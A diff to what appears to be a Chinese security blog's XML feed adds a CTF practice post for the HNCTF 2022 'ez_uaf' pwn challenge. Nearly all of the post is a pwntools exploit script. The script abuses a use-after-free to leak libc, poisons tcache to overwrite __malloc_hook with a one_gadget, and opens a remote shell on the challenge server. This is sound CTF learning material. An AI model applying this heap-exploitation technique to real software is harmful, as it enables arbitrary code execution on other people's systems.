@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>练习3</title>
+      <link href="/2025/01/31/%E7%BB%83%E4%B9%A03/"/>
+      <url>/2025/01/31/%E7%BB%83%E4%B9%A03/</url>
+      
+        <content type="html"><![CDATA[<p><strong>[HNCTF 2022 WEEK4]ez_uaf</strong></p><p>题目链接 : <span class="exturl"><a class="exturl__link"   href="https://www.nssctf.cn/problem/3105" >https://www.nssctf.cn/problem/3105</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><span id="more"></span><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>, <span class="number">25103</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ez_uaf&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ez_uaf&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size, name, message</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Choice: \n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Name: &#x27;</span>, name)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Content:&#x27;</span>, message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Choice: \n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Input your idx:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Choice: \n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Input your idx:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, message</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Choice: \n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Input your idx:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.send(message)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x410</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x70</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc:<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a2fc</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]))</span><br><span class="line">malloc(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x20</span>, p64(one_gadget), <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Choice: \n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Size:&#x27;</span>, <span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 0xa6的pwn练习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> 堆 </tag>
+            
+            <tag> mallo_hook </tag>
+            
+            <tag> tcache bin </tag>
+            
+            <tag> UAF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>练习2</title>
       <link href="/2025/01/31/%E7%BB%83%E4%B9%A02/"/>
       <url>/2025/01/31/%E7%BB%83%E4%B9%A02/</url>
